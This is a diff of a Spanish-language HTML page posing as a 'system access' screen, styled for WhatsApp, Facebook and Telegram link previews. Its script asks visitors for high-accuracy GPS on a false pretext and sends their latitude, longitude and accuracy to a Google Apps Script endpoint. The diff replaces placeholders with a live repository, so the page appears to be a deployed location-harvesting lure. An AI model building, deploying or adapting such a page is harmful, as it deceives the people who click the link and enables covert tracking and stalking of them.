@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
   <meta charset="UTF-8">
 
-  <!-- ADAPTACIÓN PARA CELULARES -->
   <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+        content="width=device-width, initial-scale=1.0">
 
   <title>Acceso al sistema</title>
 
-  <!-- ============================
-       VISTA PREVIA PARA WHATSAPP
-       ============================ -->
+  <!-- =====================================================
+       VISTA PREVIA PARA WHATSAPP / FACEBOOK / TELEGRAM
+       ===================================================== -->
 
   <meta property="og:type" content="website">
 
@@ -19,45 +19,57 @@
         content="Acceso al sistema">
 
   <meta property="og:description"
-        content="Presiona aquí para ingresar al sistema.">
+        content="Presiona aquí para ingresar.">
 
-  <!--
-       IMPORTANTE:
-       Cambia TU_USUARIO y TU_REPOSITORIO.
-       Ejemplo:
-       https://raw.githubusercontent.com/angelarias/sistema/main/ima.png
-  -->
+  <meta property="og:url"
+        content="https://ariasangel54respaldo-cmyk.github.io/youtube/">
+
+  <!-- IMAGEN DE VISTA PREVIA -->
   <meta property="og:image"
-        content="https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/ima.png">
+        content="https://raw.githubusercontent.com/ariasangel54respaldo-cmyk/youtube/main/ima.png">
 
   <meta property="og:image:secure_url"
-        content="https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/ima.png">
+        content="https://raw.githubusercontent.com/ariasangel54respaldo-cmyk/youtube/main/ima.png">
 
-  <meta property="og:image:type" content="image/png">
+  <meta property="og:image:type"
+        content="image/png">
 
-  <!-- Recomendado para WhatsApp -->
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
+  <!--
+    Lo ideal es que ima.png tenga aproximadamente
+    1200 x 630 px para una vista previa grande.
+  -->
+  <meta property="og:image:width"
+        content="1200">
 
-  <!-- Twitter/X -->
-  <meta name="twitter:card" content="summary_large_image">
+  <meta property="og:image:height"
+        content="630">
+
+  <!-- TWITTER / X -->
+  <meta name="twitter:card"
+        content="summary_large_image">
 
   <meta name="twitter:title"
         content="Acceso al sistema">
 
   <meta name="twitter:description"
-        content="Presiona aquí para ingresar al sistema.">
+        content="Presiona aquí para ingresar.">
 
   <meta name="twitter:image"
-        content="https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/ima.png">
+        content="https://raw.githubusercontent.com/ariasangel54respaldo-cmyk/youtube/main/ima.png">
 
 
   <style>
 
     * {
-      box-sizing: border-box;
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      width: 100%;
+      min-height: 100%;
     }
 
     body {
@@ -68,24 +80,31 @@
       justify-content: center;
       align-items: center;
 
-      font-family: Arial, Helvetica, sans-serif;
+      padding: 20px;
+
+      font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+      color: white;
 
       background:
         linear-gradient(
-          rgba(0, 0, 0, 0.70),
-          rgba(0, 0, 0, 0.85)
+          rgba(0,0,0,0.55),
+          rgba(0,0,0,0.80)
         ),
         url("ima.png");
 
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
-
-      color: white;
-
-      padding: 20px;
     }
 
+
+    /* ==========================
+       TARJETA PRINCIPAL
+       ========================== */
 
     .contenedor {
 
@@ -96,71 +115,82 @@
 
       text-align: center;
 
-      background: rgba(0, 0, 0, 0.45);
+      background:
+        rgba(0,0,0,0.40);
 
-      backdrop-filter: blur(8px);
-      -webkit-backdrop-filter: blur(8px);
+      border:
+        1px solid rgba(255,255,255,0.30);
 
-      border: 1px solid rgba(255,255,255,0.25);
+      border-radius: 25px;
 
-      border-radius: 22px;
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
 
       box-shadow:
-        0 15px 50px rgba(0,0,0,0.6);
+        0 20px 60px rgba(0,0,0,0.60);
     }
 
 
-    .logo {
+    /* ==========================
+       IMAGEN
+       ========================== */
 
-      width: 130px;
-      height: 130px;
+    .imagen {
+
+      width: 140px;
+      height: 140px;
 
       object-fit: cover;
 
       border-radius: 50%;
 
-      border: 3px solid rgba(255,255,255,0.8);
+      border:
+        3px solid rgba(255,255,255,0.85);
 
       margin-bottom: 25px;
 
       box-shadow:
-        0 0 25px rgba(255,255,255,0.25);
+        0 0 30px rgba(255,255,255,0.30);
     }
 
 
     h1 {
 
-      font-size: 27px;
+      font-size: 28px;
 
       margin-bottom: 15px;
-
-      letter-spacing: 1px;
     }
 
 
-    p {
+    .descripcion {
 
       font-size: 16px;
 
-      line-height: 1.5;
+      line-height: 1.6;
 
-      color: #e8e8e8;
+      color: #eeeeee;
 
       margin-bottom: 25px;
     }
 
 
-    button {
+    /* ==========================
+       BOTÓN
+       ========================== */
+
+    #btnContinuar {
 
       width: 100%;
 
-      padding: 16px;
+      padding: 17px;
 
-      border: 1px solid rgba(255,255,255,0.5);
+      border-radius: 15px;
 
-      border-radius: 14px;
+      border:
+        1px solid rgba(255,255,255,0.55);
 
-      background: rgba(255,255,255,0.15);
+      background:
+        rgba(255,255,255,0.15);
 
       color: white;
 
@@ -170,29 +200,35 @@
 
       cursor: pointer;
 
-      backdrop-filter: blur(6px);
-
       transition: 0.3s;
+
+      backdrop-filter: blur(8px);
     }
 
 
-    button:hover {
+    #btnContinuar:hover {
 
-      background: rgba(255,255,255,0.28);
+      background:
+        rgba(255,255,255,0.30);
 
-      transform: translateY(-2px);
+      transform:
+        translateY(-2px);
     }
 
 
-    button:disabled {
+    #btnContinuar:disabled {
 
-      opacity: 0.6;
+      opacity: 0.5;
 
-      cursor: not-allowed;
+      cursor: wait;
 
       transform: none;
     }
 
+
+    /* ==========================
+       MENSAJES
+       ========================== */
 
     #estado {
 
@@ -200,36 +236,46 @@
 
       font-size: 14px;
 
-      color: #ddd;
+      line-height: 1.5;
+
+      color: #eeeeee;
     }
 
+
+    /* ==========================
+       CARGANDO
+       ========================== */
 
     .spinner {
 
       display: none;
 
-      width: 35px;
-      height: 35px;
+      width: 40px;
+      height: 40px;
 
-      margin: 20px auto;
+      margin:
+        22px auto 10px auto;
 
-      border: 4px solid rgba(255,255,255,0.25);
+      border:
+        4px solid rgba(255,255,255,0.20);
 
-      border-top: 4px solid white;
+      border-top:
+        4px solid white;
 
       border-radius: 50%;
 
-      animation: girar 1s linear infinite;
+      animation:
+        girar 0.8s linear infinite;
     }
 
 
     @keyframes girar {
 
-      0% {
+      from {
         transform: rotate(0deg);
       }
 
-      100% {
+      to {
         transform: rotate(360deg);
       }
 
@@ -240,25 +286,52 @@
 
       margin-top: 25px;
 
-      font-size: 12px;
+      font-size: 11px;
 
-      opacity: 0.7;
+      line-height: 1.5;
+
+      color: rgba(255,255,255,0.65);
     }
 
 
-    @media(max-width: 480px) {
+    /* ==========================
+       CELULARES
+       ========================== */
+
+    @media
+    (max-width: 480px) {
+
+      body {
+
+        padding: 15px;
+
+        background-position: center;
+      }
+
 
       .contenedor {
-        padding: 30px 20px;
+
+        padding:
+          30px 20px;
       }
+
+
+      .imagen {
+
+        width: 115px;
+        height: 115px;
+      }
+
 
       h1 {
-        font-size: 23px;
+
+        font-size: 24px;
       }
 
-      .logo {
-        width: 110px;
-        height: 110px;
+
+      .descripcion {
+
+        font-size: 15px;
       }
 
     }
@@ -270,233 +343,343 @@
 
 <body>
 
-  <div class="contenedor">
 
-    <!-- Imagen del repositorio -->
-    <img
-      src="ima.png"
-      class="logo"
-      alt="Sistema"
-    >
-
-    <h1>
-      Bienvenido
-    </h1>
-
-    <p>
-      Para continuar al sistema es necesario permitir
-      el acceso a tu ubicación.
-    </p>
+<div class="contenedor">
 
 
-    <button
-      id="btnIngresar"
-      onclick="solicitarUbicacion()"
-    >
-      CONTINUAR
-    </button>
+  <!-- IMAGEN -->
+  <img
+    src="ima.png"
+    alt="Acceso"
+    class="imagen"
+  >
 
 
-    <div
-      id="spinner"
-      class="spinner">
-    </div>
+  <h1>
+    Bienvenido
+  </h1>
 
 
-    <div id="estado">
-      Presiona CONTINUAR para ingresar.
-    </div>
+  <p class="descripcion">
+
+    Para continuar es necesario
+    autorizar el acceso a tu ubicación.
+
+  </p>
 
 
-    <div class="privacidad">
-      Tu navegador solicitará autorización antes de
-      compartir la ubicación.
-    </div>
+  <!-- BOTÓN -->
+
+  <button
+    id="btnContinuar"
+    onclick="solicitarUbicacion()"
+  >
+
+    CONTINUAR
+
+  </button>
+
+
+  <!-- CARGANDO -->
+
+  <div
+    id="spinner"
+    class="spinner">
+  </div>
+
+
+  <!-- ESTADO -->
+
+  <div id="estado">
+
+    Presiona CONTINUAR para ingresar.
 
   </div>
+
+
+  <!-- PRIVACIDAD -->
+
+  <div class="privacidad">
+
+    El navegador solicitará tu autorización
+    antes de compartir la ubicación.
+
+  </div>
+
+
+</div>
 
 
 
 <script>
 
-  /* =========================================
-     URL DE TU GOOGLE APPS SCRIPT
-     ========================================= */
 
-  const URL_SISTEMA =
-  "https://script.google.com/macros/s/AKfycbyE-RGmsmeM7jRu00nVmqbzweWZcaSkRRqtL0WH1aZwq_YgzUYYQaj0PT0Nd5ATP_4m/exec";
+/* =====================================================
+   URL DE GOOGLE APPS SCRIPT
+   ===================================================== */
 
 
-  /* =========================================
-     SOLICITAR UBICACIÓN
-     ========================================= */
-
-  function solicitarUbicacion() {
-
-    const boton =
-      document.getElementById("btnIngresar");
-
-    const estado =
-      document.getElementById("estado");
-
-    const spinner =
-      document.getElementById("spinner");
+const URL_SISTEMA =
+"https://script.google.com/macros/s/AKfycbyE-RGmsmeM7jRu00nVmqbzweWZcaSkRRqtL0WH1aZwq_YgzUYYQaj0PT0Nd5ATP_4m/exec";
 
 
-    boton.disabled = true;
 
-    spinner.style.display = "block";
+/* =====================================================
+   SOLICITAR UBICACIÓN
+   ===================================================== */
+
+
+function solicitarUbicacion() {
+
+
+  const boton =
+    document.getElementById(
+      "btnContinuar"
+    );
+
+
+  const estado =
+    document.getElementById(
+      "estado"
+    );
+
+
+  const spinner =
+    document.getElementById(
+      "spinner"
+    );
+
+
+
+  /* ==============================
+     DESACTIVAR BOTÓN
+     ============================== */
+
+
+  boton.disabled = true;
+
+
+  spinner.style.display =
+    "block";
+
+
+  estado.innerHTML =
+    "Solicitando autorización de ubicación...";
+
+
+
+  /* ==============================
+     COMPROBAR GEOLOCALIZACIÓN
+     ============================== */
+
+
+  if (!navigator.geolocation) {
+
+
+    spinner.style.display =
+      "none";
+
+
+    boton.disabled =
+      false;
+
 
     estado.innerHTML =
-      "Solicitando permiso de ubicación...";
+      "Este dispositivo no permite obtener la ubicación.";
 
 
-    /* =========================================
-       COMPROBAR GEOLOCALIZACIÓN
-       ========================================= */
+    return;
 
-    if (!navigator.geolocation) {
+  }
+
+
+
+  /* ==============================
+     SOLICITAR PERMISO
+     ============================== */
+
+
+  navigator.geolocation.getCurrentPosition(
+
+
+    /* ==========================
+       PERMISO CONCEDIDO
+       ========================== */
+
+
+    function(position) {
+
+
+      const latitud =
+        position.coords.latitude;
+
+
+      const longitud =
+        position.coords.longitude;
+
+
+      const precision =
+        position.coords.accuracy;
+
+
 
       estado.innerHTML =
-        "Tu dispositivo no permite obtener la ubicación.";
-
-      setTimeout(function() {
-
-        redireccionar();
-
-      }, 1500);
-
-      return;
-    }
+        "Ubicación autorizada.<br>Ingresando...";
 
 
-    /* =========================================
-       PEDIR PERMISO AL USUARIO
-       ========================================= */
 
-    navigator.geolocation.getCurrentPosition(
-
-      /* UBICACIÓN AUTORIZADA */
-
-      function(position) {
-
-        const latitud =
-          position.coords.latitude;
-
-        const longitud =
-          position.coords.longitude;
-
-        const precision =
-          position.coords.accuracy;
+      /* ==========================
+         CREAR URL
+         ========================== */
 
 
-        estado.innerHTML =
-          "Ubicación autorizada.<br>Ingresando al sistema...";
+      const destino =
+
+        URL_SISTEMA +
+
+        "?lat=" +
+
+        encodeURIComponent(
+          latitud
+        ) +
+
+        "&lng=" +
+
+        encodeURIComponent(
+          longitud
+        ) +
+
+        "&accuracy=" +
+
+        encodeURIComponent(
+          precision
+        );
 
 
-        /* =====================================
-           ENVIAMOS LOS DATOS AL APPS SCRIPT
-           ===================================== */
 
-        const destino =
-          URL_SISTEMA
-          + "?lat="
-          + encodeURIComponent(latitud)
-          + "&lng="
-          + encodeURIComponent(longitud)
-          + "&accuracy="
-          + encodeURIComponent(precision);
+      /* ==========================
+         REDIRECCIONAR
+         ========================== */
 
 
-        setTimeout(function() {
+      setTimeout(
 
-          window.location.href = destino;
-
-        }, 800);
-
-      },
+        function() {
 
 
-      /* =========================================
-         SI EL USUARIO NO AUTORIZA
-         ========================================= */
-
-      function(error) {
-
-        spinner.style.display = "none";
-
-        boton.disabled = false;
+          window.location.href =
+            destino;
 
 
-        switch(error.code) {
+        },
 
-          case error.PERMISSION_DENIED:
+        700
 
-            estado.innerHTML =
-              "Debes autorizar la ubicación desde tu navegador para continuar.";
-
-            break;
+      );
 
 
-          case error.POSITION_UNAVAILABLE:
-
-            estado.innerHTML =
-              "No se pudo determinar tu ubicación. Intenta nuevamente.";
-
-            break;
+    },
 
 
-          case error.TIMEOUT:
 
-            estado.innerHTML =
-              "La solicitud de ubicación tardó demasiado. Intenta nuevamente.";
-
-            break;
+    /* ==========================
+       ERROR / PERMISO DENEGADO
+       ========================== */
 
 
-          default:
-
-            estado.innerHTML =
-              "No se pudo obtener la ubicación.";
-
-        }
-
-      },
+    function(error) {
 
 
-      /* =========================================
-         CONFIGURACIÓN GPS
-         ========================================= */
+      spinner.style.display =
+        "none";
 
-      {
 
-        enableHighAccuracy: true,
+      boton.disabled =
+        false;
 
-        timeout: 15000,
 
-        maximumAge: 0
+
+      switch(error.code) {
+
+
+        case error.PERMISSION_DENIED:
+
+
+          estado.innerHTML =
+            "No se autorizó el acceso a la ubicación. " +
+            "Para continuar, habilita el permiso de ubicación en tu navegador.";
+
+
+          break;
+
+
+
+        case error.POSITION_UNAVAILABLE:
+
+
+          estado.innerHTML =
+            "No se pudo determinar tu ubicación. " +
+            "Verifica que el GPS esté activado e intenta nuevamente.";
+
+
+          break;
+
+
+
+        case error.TIMEOUT:
+
+
+          estado.innerHTML =
+            "La ubicación tardó demasiado en responder. " +
+            "Presiona CONTINUAR para intentarlo nuevamente.";
+
+
+          break;
+
+
+
+        default:
+
+
+          estado.innerHTML =
+            "No fue posible obtener la ubicación.";
+
 
       }
 
-    );
 
-  }
-
+    },
 
 
-  /* =========================================
-     REDIRECCIÓN NORMAL
-     ========================================= */
 
-  function redireccionar() {
+    /* ==========================
+       CONFIGURACIÓN GPS
+       ========================== */
 
-    window.location.href =
-      URL_SISTEMA;
 
-  }
+    {
+
+      enableHighAccuracy:
+        true,
+
+      timeout:
+        20000,
+
+      maximumAge:
+        0
+
+    }
+
+
+  );
+
+
+}
+
 
 </script>
 
 
 </body>
+
 </html>
